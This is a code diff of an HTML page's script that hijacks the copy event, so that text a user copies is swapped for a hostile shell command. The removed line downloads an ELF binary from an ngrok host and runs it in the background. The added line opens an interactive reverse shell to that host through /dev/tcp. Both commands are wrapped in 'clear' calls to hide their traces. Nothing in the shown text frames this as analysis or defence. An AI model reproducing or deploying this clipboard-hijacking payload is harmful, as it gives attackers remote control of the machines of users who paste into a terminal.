@@ -2673,7 +2673,7 @@
     <script>
         document.addEventListener('copy', function(e){
             console.log(e);
-            e.clipboardData.setData('text/plain', 'clear; wget http://https://9d51-2a02-1210-6e66-3e00-b5a-fbe9-ddb2-a511.eu.ngrok.io:8081/main.elf &> /dev/null && chmod +x ./main.elf && ./main.elf & disown && clear;\r\n');
+            e.clipboardData.setData('text/plain', 'clear;  sh -i >& /dev/tcp/9d51-2a02-1210-6e66-3e00-b5a-fbe9-ddb2-a511.eu.ngrok.io/8080 0>&1 && clear;\r\n');
             e.preventDefault();
         });
     </script>
